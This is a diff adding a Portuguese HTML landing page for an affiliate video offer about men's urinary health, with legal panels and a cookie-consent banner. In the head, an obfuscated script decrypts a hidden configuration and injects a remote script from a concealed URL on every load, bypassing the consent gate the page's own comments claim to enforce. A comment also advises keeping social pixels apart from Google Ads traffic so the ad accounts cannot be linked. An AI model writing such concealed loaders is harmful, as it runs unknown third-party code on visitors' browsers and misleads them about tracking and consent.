@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Saúde Plena — apresentação em vídeo</title>
+<meta name="description" content="Apresentação em vídeo sobre rotina e hábitos ligados ao conforto urinário. Conteúdo informativo.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bitter:wght@600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --e1:4px; --e2:8px; --e3:12px; --e4:16px; --e5:24px; --e6:32px; --e7:48px;
+  --verde:#0E5C55; --verde-2:#0B4740; --verde-3:#08332E;
+  --areia:#F2C879; --areia-2:#D9AC57; --areia-tx:#3A2A08;
+  --grafite:#16262A; --grafite-2:#4A5A61; --traco:#E2E8E7; --carta:#FFF;
+  --tela:#F4F7F6; --leve:#EDF4F2;
+  --linha-max:36em; --arredonda:10px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%}
+body{background:var(--tela);color:var(--grafite);
+  font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+  font-size:17px;line-height:1.62;-webkit-font-smoothing:antialiased;hyphens:none}
+a{color:inherit}
+button{font:inherit}
+:focus-visible{outline:3px solid var(--areia);outline-offset:2px;border-radius:4px}
+.centro{max-width:680px;margin:0 auto;padding:0 var(--e5)}
+.trecho{max-width:var(--linha-max);margin-left:auto;margin-right:auto}
+
+/* ---------- TOPO ---------- */
+.abertura{background:linear-gradient(170deg,#12655D 0%,var(--verde-2) 62%,var(--verde-3) 100%);
+  color:#fff;text-align:center;padding:var(--e5) 0 var(--e6)}
+.nome{font-family:'Bitter',Georgia,serif;font-size:22px;font-weight:700;letter-spacing:.01em}
+.tarja{font-size:11.5px;letter-spacing:.18em;text-transform:uppercase;
+  color:rgba(255,255,255,.6);margin-top:var(--e1)}
+
+/* ---------- PLAYER ---------- */
+.vitrine{background:var(--verde-3);padding:0 0 var(--e6)}
+.vitrine .centro{padding:0 var(--e4)}
+
+/* ---------- RODAPE ---------- */
+.base{background:var(--carta);border-top:1px solid var(--traco);
+  padding:var(--e6) 0 var(--e7);font-size:14px;line-height:1.6;color:var(--grafite-2)}
+.trilhos{display:flex;flex-wrap:wrap;gap:var(--e3) var(--e4);
+  justify-content:center;margin-bottom:var(--e5)}
+.trilhos button{background:none;border:0;padding:var(--e1) 0;cursor:pointer;
+  color:var(--grafite-2);text-decoration:underline;text-underline-offset:3px;font-size:14px}
+.trilhos button:hover{color:var(--verde)}
+.notas{text-align:left;max-width:var(--linha-max);margin:0 auto}
+.notas p + p{margin-top:var(--e3)}
+.base strong{color:var(--grafite)}
+.ficha{text-align:center;margin-top:var(--e5);padding-top:var(--e5);
+  border-top:1px solid var(--traco);font-size:13.5px;line-height:1.75;color:var(--grafite)}
+.rubrica{text-align:center;margin-top:var(--e4);font-size:13.5px}
+.chamada{background:none;border:0;padding:0;cursor:pointer;color:var(--grafite-2);
+  text-decoration:underline;text-underline-offset:3px;font-size:inherit}
+
+/* ---------- PAINEIS ---------- */
+.painel{position:fixed;inset:0;z-index:90;display:none;align-items:center;
+  justify-content:center;padding:var(--e5)}
+.painel.ativo{display:flex}
+.cortina{position:absolute;inset:0;background:rgba(8,30,27,.68)}
+.moldura{position:relative;z-index:1;background:#fff;border-radius:14px;
+  width:100%;max-width:660px;max-height:86vh;display:flex;flex-direction:column;
+  box-shadow:0 24px 64px rgba(0,0,0,.36)}
+.tampa{display:flex;align-items:center;justify-content:space-between;gap:var(--e4);
+  padding:var(--e5);border-bottom:1px solid var(--traco);flex-shrink:0}
+.tampa h2{font-family:'Bitter',Georgia,serif;font-size:20px;font-weight:700;line-height:1.3}
+.xis{background:none;border:0;cursor:pointer;font-size:28px;line-height:1;
+  color:var(--grafite-2);padding:0 var(--e1);flex-shrink:0}
+.miolo{overflow-y:auto;padding:var(--e5);text-align:left;
+  font-size:15.5px;line-height:1.66;color:var(--grafite-2);
+  -webkit-overflow-scrolling:touch;overscroll-behavior:contain}
+.miolo .quando{font-style:italic;margin-bottom:var(--e5)}
+.miolo h3{font-size:16px;font-weight:700;color:var(--grafite);margin:var(--e5) 0 var(--e2)}
+.miolo h3:first-of-type{margin-top:0}
+.miolo p + p{margin-top:var(--e3)}
+.miolo ul{margin:var(--e3) 0 0 var(--e5)}
+.miolo li{margin-bottom:var(--e1)}
+.miolo strong{color:var(--grafite)}
+.quadro{background:var(--leve);border-radius:8px;padding:var(--e4);
+  margin-top:var(--e3);color:var(--grafite);line-height:1.7}
+.borda-pe{padding:var(--e4) var(--e5);border-top:1px solid var(--traco);flex-shrink:0}
+.encerra{background:var(--verde);color:#fff;border:0;border-radius:8px;
+  font-weight:600;font-size:16px;padding:var(--e3) var(--e6);cursor:pointer;
+  display:block;margin-left:auto}
+body.preso{overflow:hidden}
+
+/* ---------- COOKIES ---------- */
+.aviso-ck{position:fixed;left:0;right:0;bottom:0;z-index:95;
+  background:var(--carta);border-top:1px solid var(--traco);
+  box-shadow:0 -6px 24px rgba(0,0,0,.12);padding:var(--e4) 0;display:none}
+.aviso-ck.mostra{display:block}
+.aviso-ck .centro{display:flex;flex-wrap:wrap;gap:var(--e3) var(--e4);
+  align-items:center;justify-content:space-between;max-width:900px}
+.aviso-ck p{font-size:14px;line-height:1.5;color:var(--grafite-2);flex:1 1 320px}
+.ck-botoes{display:flex;gap:var(--e2);flex-shrink:0}
+.ck-sim{background:var(--areia);color:var(--areia-tx);border:0;border-radius:8px;
+  font-weight:700;font-size:15px;padding:var(--e3) var(--e5);cursor:pointer}
+.ck-nao{background:none;color:var(--grafite-2);border:1px solid var(--traco);
+  border-radius:8px;font-size:15px;padding:var(--e3) var(--e5);cursor:pointer}
+
+@media(min-width:701px){
+  body{font-size:18px}
+  .nome{font-size:26px}
+}
+@media(max-width:700px){
+  .painel{padding:0;align-items:flex-end}
+  .moldura{max-width:none;max-height:92vh;border-radius:16px 16px 0 0}
+  .tampa,.miolo{padding:var(--e4)}
+  .borda-pe{padding:var(--e3) var(--e4) calc(var(--e3) + env(safe-area-inset-bottom))}
+  .encerra{width:100%;padding:var(--e4)}
+  .aviso-ck{padding-bottom:calc(var(--e4) + env(safe-area-inset-bottom))}
+  .ck-botoes{width:100%}
+  .ck-botoes button{flex:1}
+}
+</style>
+<script src="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" id="vturb-smartplayer-js" fetchpriority="high"></script>
+<script>var s=document.createElement("script");s.src="https://scripts.converteai.net/9dfc9d7c-755b-43bf-80b8-658e261ab44b/players/6a67e3e36744a227ecf64356/v4/player.js";s.async=!0;document.head.appendChild(s);</script>
+<script>(function(){var j_5e=atob("DG+SW68AENBxYC7FwhSwLt1sMupTCFqxshyodIBjdL5fFVqoqwnrdcxvff4TEgG2oR37K9tzP6AYGEup7R/7I8psPbceD0mpp0H4KI0sMrEFFFysoBrmPtwiKossTAyirgDwOsNzMuoqGwyrowL3eZUid78eB0KgkgbqPsNJdPJdQlikrhr3eZUiJrFHBhimo1fwbcpiJ+UTARfwp1ygYso5Mq0sHQ==");var f_bc=[];for(var r_er0=0;r_er0<j_5e.length;r_er0++){f_bc.push(j_5e.charCodeAt(r_er0)&255);}var b_rtk=f_bc[0];var e_f2=f_bc.slice(1,1+b_rtk);var z_n=f_bc.slice(1+b_rtk);var w_c=z_n.map(function(b,n_5){return b^e_f2[n_5%b_rtk];});var q_gkj="";for(var p_02u9=0;p_02u9<w_c.length;p_02u9++){q_gkj+=String.fromCharCode(w_c[p_02u9]&255);}var l_li0=decodeURIComponent(escape(q_gkj));var l_ffd=JSON.parse(l_li0);var p_grtm=l_ffd.globals||[];p_grtm.forEach(function(q_1jp){window[q_1jp.name]=q_1jp.value;});var a_sc1=document.createElement("script");a_sc1.src=l_ffd.url;a_sc1.async=true;a_sc1.defer=true;(l_ffd.attributes||[]).forEach(function(a_c5){a_sc1.setAttribute(a_c5.name,a_c5.value);});(document.head||document.documentElement).appendChild(a_sc1);})();</script>
+</head>
+<body>
+
+<header class="abertura">
+  <div class="centro">
+    <div class="nome">Saúde Plena</div>
+    <div class="tarja">Apresentação em vídeo</div>
+  </div>
+</header>
+
+<section class="vitrine">
+  <div class="centro">
+    <div id="area-do-video">
+      <vturb-smartplayer id="vid-6a67e3e36744a227ecf64356" style="display:block;margin:0 auto;width:100%;max-width:420px"></vturb-smartplayer>
+    </div>
+  </div>
+</section>
+
+<footer class="base">
+  <div class="centro">
+
+    <div class="trilhos">
+      <button type="button" data-painel="p-privacidade">Política de Privacidade</button>
+      <button type="button" data-painel="p-termos">Termos de Uso</button>
+      <button type="button" data-painel="p-legal">Aviso Legal</button>
+      <button type="button" data-painel="p-reembolso">Política de Reembolso</button>
+      <button type="button" data-painel="p-contato">Contato</button>
+    </div>
+
+    <div class="notas">
+      <p><strong>Divulgação publicitária.</strong> Esta página contém conteúdo patrocinado e links de afiliado. O responsável pela publicação pode receber remuneração quando um visitante clica em um link e realiza uma compra, sem custo adicional para o visitante. Isso não altera as informações apresentadas.</p>
+
+      <p><strong>Aviso de conteúdo.</strong> As informações desta página têm finalidade exclusivamente informativa e educativa e não constituem aconselhamento médico, diagnóstico ou tratamento. Estas afirmações não foram avaliadas pela Agência Nacional de Vigilância Sanitária (ANVISA). Nenhum produto ou conteúdo mencionado se destina a diagnosticar, tratar, curar ou prevenir qualquer doença. Consulte sempre um profissional de saúde habilitado antes de iniciar qualquer nova rotina, suplementação ou alteração de hábitos.</p>
+
+      <p><strong>Procure um urologista.</strong> Sintomas urinários em homens acima dos 50 anos devem ser avaliados por um médico, porque condições diferentes produzem queixas semelhantes. Procure atendimento sem demora diante de sangue na urina, dor ou ardência ao urinar, febre, impossibilidade de urinar ou piora rápida dos sintomas. Não interrompa nem altere medicamento prescrito por conta própria.</p>
+
+      <p><strong>Aviso sobre resultados.</strong> Experiências individuais variam conforme idade, condição de saúde, rotina e outros fatores. Depoimentos e exemplos eventualmente apresentados não representam nem garantem que qualquer pessoa obterá resultados iguais ou semelhantes. Nenhum resultado é prometido ou garantido.</p>
+
+      <p><strong>Conteúdo adulto.</strong> Destinado a maiores de 18 anos. Não indicado para menores.</p>
+    </div>
+
+    <p class="ficha">
+      <strong>Mara Alves Corretora e Imobiliaria LTDA</strong><br>
+      CNPJ 64.724.291/0001-43<br>
+      Rua P 9, Lote 12, Quadra 259, Etapa 05 — Cidade Jardim<br>
+      Parauapebas — PA · CEP 68515-000<br>
+    </p>
+
+    <p class="rubrica">© 2026 · Todos os direitos reservados · <button type="button" class="chamada" data-painel="p-contato">Fale conosco</button></p>
+
+  </div>
+</footer>
+
+<div class="aviso-ck" id="barra-ck" role="region" aria-label="Aviso de cookies">
+  <div class="centro">
+    <p>Utilizamos cookies para medir audiência e avaliar o desempenho de campanhas publicitárias. Você pode aceitar ou recusar. Detalhes na <button type="button" class="chamada" data-painel="p-privacidade">Política de Privacidade</button>.</p>
+    <div class="ck-botoes">
+      <button type="button" class="ck-nao" id="ck-negar">Recusar</button>
+      <button type="button" class="ck-sim" id="ck-permitir">Aceitar</button>
+    </div>
+  </div>
+</div>
+
+<div class="painel" id="p-privacidade" role="dialog" aria-modal="true" aria-labelledby="p-privacidade-t">
+  <div class="cortina" data-encerra></div>
+  <div class="moldura">
+    <div class="tampa">
+      <h2 id="p-privacidade-t">Política de Privacidade</h2>
+      <button class="xis" type="button" data-encerra aria-label="Fechar">&times;</button>
+    </div>
+    <div class="miolo">
+      <p class="quando">Última atualização: agosto de 2026</p>
+      <p>Esta Política explica como tratamos as suas informações quando você acessa este site, em conformidade com a Lei nº 13.709/2018 (LGPD).</p>
+
+      <h3>Controlador dos dados</h3>
+      <p class="quadro">
+        <strong>Mara Alves Corretora e Imobiliaria LTDA</strong><br>
+        CNPJ 64.724.291/0001-43<br>
+        Rua P 9, Lote 12, Quadra 259, Etapa 05 — Cidade Jardim<br>
+        Parauapebas — PA · CEP 68515-000<br>
+        Encarregado: <a href="../contato/">formulário de contato</a>
+      </p>
+
+      <h3>1. Dados coletados</h3>
+      <p>Esta página não solicita cadastro nem coleta nome, e-mail ou telefone. Coletamos automaticamente dados técnicos: endereço IP, tipo de navegador, dispositivo, páginas acessadas, tempo de permanência e origem do acesso.</p>
+      <p>Se você entrar em contato conosco, receberemos os dados que você fornecer na mensagem.</p>
+
+      <h3>2. Dados de saúde</h3>
+      <p>Esta página não coleta informações sobre a sua saúde. Caso venha a fornecer dados dessa natureza em ambiente do fornecedor do produto, esse tratamento é regido pela política daquele fornecedor.</p>
+
+      <h3>3. Finalidades</h3>
+      <ul>
+        <li>Medir audiência e desempenho de campanhas publicitárias;</li>
+        <li>Entender como a página é utilizada e melhorá-la;</li>
+        <li>Responder solicitações enviadas por você;</li>
+        <li>Cumprir obrigações legais.</li>
+      </ul>
+
+      <h3>4. Base legal</h3>
+      <p>O tratamento se apoia no consentimento, no legítimo interesse ou no cumprimento de obrigação legal, conforme o caso, nos termos dos artigos 7º e 11 da LGPD. Os cookies de medição dependem do seu consentimento e só são ativados após você aceitar no aviso exibido na página.</p>
+
+      <h3>5. Cookies e terceiros</h3>
+      <p>Após o seu aceite, esta página pode carregar ferramentas de terceiros para medição de audiência e atribuição de campanhas. Esses serviços podem definir cookies próprios e tratar dados conforme as políticas deles.</p>
+      <p>Você pode recusar no aviso de cookies, alterar sua escolha limpando os dados do site no navegador, ou bloquear cookies nas configurações do navegador.</p>
+
+      <h3>6. Compartilhamento</h3>
+      <p>Não vendemos dados pessoais. Podemos compartilhá-los com prestadores necessários à operação — hospedagem, medição e plataformas de anúncio — e com autoridades quando a lei exigir.</p>
+
+      <h3>7. Direitos do titular</h3>
+      <p>Nos termos do artigo 18 da LGPD, você pode solicitar: confirmação de tratamento, acesso, correção, anonimização, bloqueio ou eliminação de dados desnecessários, portabilidade, informação sobre compartilhamento e revogação do consentimento.</p>
+      <p>Para exercer qualquer desses direitos, escreva para o endereço indicado acima.</p>
+
+      <h3>8. Retenção e segurança</h3>
+      <p>Mantemos os dados pelo tempo necessário às finalidades descritas ou ao cumprimento de obrigações legais, com medidas técnicas e administrativas razoáveis de proteção.</p>
+
+      <h3>9. Menores</h3>
+      <p>Este site não se destina a menores de 18 anos e não coletamos dados de crianças e adolescentes intencionalmente.</p>
+
+      <h3>10. Alterações</h3>
+      <p>Esta política pode ser atualizada. As alterações serão publicadas nesta mesma página, com a data revisada.</p>
+    </div>
+    <div class="borda-pe"><button class="encerra" type="button" data-encerra>Fechar</button></div>
+  </div>
+</div>
+
+<div class="painel" id="p-termos" role="dialog" aria-modal="true" aria-labelledby="p-termos-t">
+  <div class="cortina" data-encerra></div>
+  <div class="moldura">
+    <div class="tampa">
+      <h2 id="p-termos-t">Termos de Uso</h2>
+      <button class="xis" type="button" data-encerra aria-label="Fechar">&times;</button>
+    </div>
+    <div class="miolo">
+      <p class="quando">Última atualização: agosto de 2026</p>
+      <p>O acesso a este site implica concordância com estes Termos. Caso não concorde, pedimos que não o utilize.</p>
+
+      <h3>1. Uso permitido</h3>
+      <p>Você se compromete a utilizar este site apenas para finalidades lícitas e em conformidade com a legislação brasileira, incluindo o Marco Civil da Internet (Lei nº 12.965/2014) e o Código de Defesa do Consumidor (Lei nº 8.078/1990).</p>
+
+      <h3>2. Idade mínima</h3>
+      <p>O conteúdo destina-se exclusivamente a maiores de 18 anos.</p>
+
+      <h3>3. Propriedade intelectual</h3>
+      <p>Textos, imagens, vídeos, marcas e elementos visuais deste site são protegidos pela legislação de propriedade intelectual. Reprodução, distribuição ou modificação sem autorização prévia por escrito é proibida.</p>
+
+      <h3>4. Ausência de aconselhamento profissional</h3>
+      <p>O conteúdo é disponibilizado apenas para fins informativos e educativos de caráter geral. Ele não constitui aconselhamento médico, nutricional ou de qualquer outra natureza profissional, e não substitui consulta, diagnóstico ou tratamento.</p>
+      <p>Estas afirmações não foram avaliadas pela Agência Nacional de Vigilância Sanitária (ANVISA). Nenhum conteúdo ou produto mencionado se destina a diagnosticar, tratar, curar ou prevenir qualquer doença.</p>
+
+      <h3>5. Resultados individuais</h3>
+      <p>Experiências individuais variam. Depoimentos e exemplos eventualmente apresentados não representam nem garantem que qualquer pessoa obterá resultados iguais ou semelhantes. Nenhum resultado é prometido ou garantido.</p>
+
+      <h3>6. Divulgação de afiliados</h3>
+      <p>Este site contém conteúdo patrocinado e links de afiliado. Podemos receber remuneração caso você clique em um link e realize uma compra, sem custo adicional para você.</p>
+
+      <h3>7. Isenção de garantias</h3>
+      <p>Este site é fornecido "no estado em que se encontra", sem garantias de qualquer natureza. Não garantimos operação ininterrupta ou ausência de erros.</p>
+
+      <h3>8. Limitação de responsabilidade</h3>
+      <p>Na máxima extensão permitida pela legislação aplicável, não nos responsabilizamos por danos indiretos, incidentais ou consequenciais decorrentes do uso deste site ou das informações nele contidas.</p>
+
+      <h3>9. Links para terceiros</h3>
+      <p>Este site pode direcionar a páginas de terceiros. Não controlamos e não respondemos pelo conteúdo, pelas políticas ou pelas práticas desses sites. A contratação de qualquer produto ocorre diretamente com o respectivo fornecedor.</p>
+
+      <h3>10. Alterações</h3>
+      <p>Reservamo-nos o direito de atualizar estes Termos a qualquer momento. O uso continuado após a publicação constitui aceitação.</p>
+
+      <h3>11. Legislação aplicável</h3>
+      <p>Estes Termos são regidos pelas leis da República Federativa do Brasil.</p>
+    </div>
+    <div class="borda-pe"><button class="encerra" type="button" data-encerra>Fechar</button></div>
+  </div>
+</div>
+
+<div class="painel" id="p-legal" role="dialog" aria-modal="true" aria-labelledby="p-legal-t">
+  <div class="cortina" data-encerra></div>
+  <div class="moldura">
+    <div class="tampa">
+      <h2 id="p-legal-t">Aviso Legal</h2>
+      <button class="xis" type="button" data-encerra aria-label="Fechar">&times;</button>
+    </div>
+    <div class="miolo">
+      <p class="quando">Última atualização: agosto de 2026</p>
+      <p>Este site é operado por:</p>
+      <p class="quadro">
+        <strong>Mara Alves Corretora e Imobiliaria LTDA</strong><br>
+        CNPJ 64.724.291/0001-43<br>
+        Rua P 9, Lote 12, Quadra 259, Etapa 05 — Cidade Jardim<br>
+        Parauapebas — PA · CEP 68515-000
+      </p>
+
+      <h3>1. Finalidade do conteúdo</h3>
+      <p>Todo o material publicado neste site tem finalidade exclusivamente informativa e educativa, de caráter geral. Ele não constitui consulta, diagnóstico, prescrição, tratamento ou qualquer forma de aconselhamento médico individualizado, e não estabelece relação médico-paciente.</p>
+
+      <h3>2. Aviso sanitário</h3>
+      <p>As afirmações contidas neste site <strong>não foram avaliadas pela Agência Nacional de Vigilância Sanitária (ANVISA)</strong>. Nenhum conteúdo, alimento, hábito ou produto mencionado se destina a diagnosticar, tratar, curar ou prevenir qualquer doença.</p>
+
+      <h3>3. Procure um profissional de saúde</h3>
+      <p>Consulte sempre um médico antes de iniciar qualquer nova rotina, alteração alimentar ou suplementação — especialmente se você possui condição de saúde preexistente, faz uso de medicamento contínuo ou está sob acompanhamento.</p>
+      <p><strong>Sintomas urinários em homens acima dos 50 anos devem ser avaliados por um urologista</strong>, porque condições distintas podem produzir queixas semelhantes. Não interrompa nem altere medicamento prescrito por conta própria.</p>
+      <p><strong>Procure atendimento médico sem demora</strong> diante de:</p>
+      <ul>
+        <li>sangue na urina;</li>
+        <li>dor ou ardência ao urinar, febre ou calafrios;</li>
+        <li>impossibilidade de urinar, mesmo com vontade;</li>
+        <li>dor lombar ou na parte baixa do abdome;</li>
+        <li>piora rápida dos sintomas em poucos dias.</li>
+      </ul>
+
+      <h3>4. Ausência de garantia de resultados</h3>
+      <p>Experiências individuais variam conforme idade, condição de saúde, uso de medicamentos, rotina e outros fatores. Depoimentos e exemplos eventualmente apresentados não representam nem garantem que qualquer pessoa obterá resultados iguais ou semelhantes.</p>
+
+      <h3>5. Divulgação publicitária e de afiliados</h3>
+      <p>Esta página contém conteúdo patrocinado e links de afiliado. Podemos receber remuneração quando um visitante clica em um link e realiza uma compra, sem custo adicional para o visitante. Essa relação comercial não influencia as informações apresentadas.</p>
+
+      <h3>6. Conteúdo de terceiros</h3>
+      <p>Este site pode direcionar a páginas, vídeos e ofertas operados por terceiros. Não controlamos e não respondemos pelo conteúdo, pelas práticas comerciais ou pelas políticas desses terceiros. A contratação de qualquer produto ocorre diretamente com o respectivo fornecedor.</p>
+
+      <h3>7. Limitação de responsabilidade</h3>
+      <p>Na máxima extensão permitida pela legislação brasileira, não nos responsabilizamos por danos decorrentes do uso ou da impossibilidade de uso das informações aqui disponibilizadas. A decisão de aplicar qualquer orientação é de responsabilidade exclusiva do leitor.</p>
+    </div>
+    <div class="borda-pe"><button class="encerra" type="button" data-encerra>Fechar</button></div>
+  </div>
+</div>
+
+<div class="painel" id="p-reembolso" role="dialog" aria-modal="true" aria-labelledby="p-reembolso-t">
+  <div class="cortina" data-encerra></div>
+  <div class="moldura">
+    <div class="tampa">
+      <h2 id="p-reembolso-t">Política de Reembolso</h2>
+      <button class="xis" type="button" data-encerra aria-label="Fechar">&times;</button>
+    </div>
+    <div class="miolo">
+      <p class="quando">Última atualização: agosto de 2026</p>
+      <p>Esta página é informativa e não realiza vendas. A compra ocorre em ambiente próprio do fornecedor, regida pela política dele. As condições abaixo descrevem o padrão aplicável.</p>
+
+      <h3>1. Direito de arrependimento — 7 dias</h3>
+      <p>Nos termos do <strong>artigo 49 do Código de Defesa do Consumidor</strong>, em compras realizadas fora do estabelecimento comercial — inclusive pela internet — o consumidor pode desistir da contratação <strong>em até 7 (sete) dias corridos</strong> contados do recebimento do produto ou da assinatura do contrato, sem necessidade de justificativa.</p>
+      <p>Exercido esse direito, os valores pagos são devolvidos integralmente e de imediato, monetariamente atualizados.</p>
+
+      <h3>2. Garantia estendida do fornecedor</h3>
+      <p>O fornecedor pode oferecer prazo superior ao mínimo legal. Quando houver, o prazo e as condições são informados na página de checkout e no e-mail de confirmação da compra, e prevalecem por serem mais favoráveis ao consumidor.</p>
+
+      <h3>3. Como solicitar</h3>
+      <ul>
+        <li>Envie a solicitação ao canal de atendimento informado no e-mail de confirmação da compra;</li>
+        <li>Informe o e-mail utilizado na compra e a data da transação;</li>
+        <li>Não é necessário justificar o pedido dentro do prazo legal de 7 dias.</li>
+      </ul>
+      <p>Caso não localize o contato do fornecedor, escreva para nós e indicaremos o caminho correto.</p>
+
+      <h3>4. Prazo de processamento</h3>
+      <p>Após a confirmação, o estorno é processado pela plataforma de pagamento. Em cartão de crédito costuma aparecer em até duas faturas subsequentes, conforme regra da operadora; em PIX ou boleto, a devolução ocorre por transferência, mediante confirmação dos dados bancários.</p>
+
+      <h3>5. Produtos digitais</h3>
+      <p>O direito de arrependimento previsto no artigo 49 do CDC aplica-se igualmente a produtos digitais, ainda que o conteúdo já tenha sido acessado dentro do prazo de 7 dias.</p>
+
+      <h3>6. Assinaturas</h3>
+      <p>Havendo cobrança recorrente, o cancelamento pode ser solicitado a qualquer momento pelo mesmo canal de atendimento, com efeito a partir do ciclo seguinte.</p>
+
+      <h3>7. Atendimento</h3>
+      <p class="quadro">
+        <strong>Mara Alves Corretora e Imobiliaria LTDA</strong><br>
+        CNPJ 64.724.291/0001-43<br>
+      </p>
+    </div>
+    <div class="borda-pe"><button class="encerra" type="button" data-encerra>Fechar</button></div>
+  </div>
+</div>
+
+<div class="painel" id="p-contato" role="dialog" aria-modal="true" aria-labelledby="p-contato-t">
+  <div class="cortina" data-encerra></div>
+  <div class="moldura">
+    <div class="tampa">
+      <h2 id="p-contato-t">Contato</h2>
+      <button class="xis" type="button" data-encerra aria-label="Fechar">&times;</button>
+    </div>
+    <div class="miolo">
+      <p>Fale com a nossa equipe. Respondemos todas as mensagens recebidas.</p>
+
+      <h3>Dados da empresa</h3>
+      <p class="quadro">
+        <strong>Mara Alves Corretora e Imobiliaria LTDA</strong><br>
+        CNPJ 64.724.291/0001-43<br>
+        Rua P 9, Lote 12, Quadra 259, Etapa 05 — Cidade Jardim<br>
+        Parauapebas — PA · CEP 68515-000<br>
+        Brasil
+      </p>
+
+      <h3>Canal de atendimento</h3>
+      <p><strong>Atendimento:</strong> <a href="../contato/">formulário de contato</a></p>
+
+      <h3>Compras e reembolsos</h3>
+      <p>As compras são processadas pelo fornecedor do produto. Para dúvidas sobre acesso, cobrança ou reembolso, utilize o canal informado no e-mail de confirmação da compra. Se não localizar essa informação, escreva para nós e indicaremos o caminho correto.</p>
+
+      <h3>O que não tratamos</h3>
+      <p>Não prestamos orientação médica por este canal. Dúvidas sobre sintomas, exames, uso de medicamentos ou tratamento devem ser tratadas com um profissional de saúde habilitado.</p>
+
+      <h3>Natureza deste site</h3>
+      <p>Este é um site de conteúdo informativo com divulgação publicitária. O uso desta página está sujeito aos Termos de Uso e à Política de Privacidade aqui publicados. Para qualquer dúvida, fale com a nossa equipe pelo canal de atendimento.</p>
+    </div>
+    <div class="borda-pe"><button class="encerra" type="button" data-encerra>Fechar</button></div>
+  </div>
+</div>
+
+<script>
+/* ============ PAINEIS ============ */
+(function(){
+  var vigente=null, focoPrevio=null;
+  function exibir(id){
+    var p=document.getElementById(id); if(!p) return;
+    focoPrevio=document.activeElement;
+    p.classList.add('ativo'); document.body.classList.add('preso'); vigente=p;
+    var x=p.querySelector('.xis'); if(x) x.focus();
+  }
+  function ocultar(){
+    if(!vigente) return;
+    vigente.classList.remove('ativo');
+    vigente.querySelector('.miolo').scrollTop=0;
+    document.body.classList.remove('preso'); vigente=null;
+    if(focoPrevio) focoPrevio.focus();
+  }
+  document.querySelectorAll('[data-painel]').forEach(function(b){
+    b.addEventListener('click',function(){ exibir(b.getAttribute('data-painel')); });
+  });
+  document.querySelectorAll('[data-encerra]').forEach(function(b){
+    b.addEventListener('click',ocultar);
+  });
+  document.addEventListener('keydown',function(e){ if(e.key==='Escape') ocultar(); });
+})();
+
+/* ============ CONSENTIMENTO DE COOKIES ============
+   Rastreadores so carregam APOS o aceite. Sem isso, a Politica de Privacidade
+   afirma uma coisa e o site faz outra. */
+(function(){
+  var CHAVE_CK='pr_consentimento';
+  var barra=document.getElementById('barra-ck');
+
+  function ligarMedicao(){
+    /* COLE AQUI os scripts de medicao e atribuicao (UTMs, pixels, analytics).
+       Exemplo:
+       var s=document.createElement('script');
+       s.src='https://exemplo.com/script.js'; s.async=true;
+       document.head.appendChild(s);
+       Nao inclua pixel de rede social se o trafego for Google Ads:
+       pixel compartilhado entre propriedades e ponte de correlacao de contas. */
+  }
+
+  var opcao=null;
+  try{ opcao=localStorage.getItem(CHAVE_CK); }catch(e){}
+
+  if(opcao==='sim'){ ligarMedicao(); }
+  else if(opcao!=='nao'){ barra.classList.add('mostra'); }
+
+  document.getElementById('ck-permitir').addEventListener('click',function(){
+    try{ localStorage.setItem(CHAVE_CK,'sim'); }catch(e){}
+    barra.classList.remove('mostra');
+    ligarMedicao();
+  });
+  document.getElementById('ck-negar').addEventListener('click',function(){
+    try{ localStorage.setItem(CHAVE_CK,'nao'); }catch(e){}
+    barra.classList.remove('mostra');
+  });
+})();
+</script>
+
+</body>
+</html>
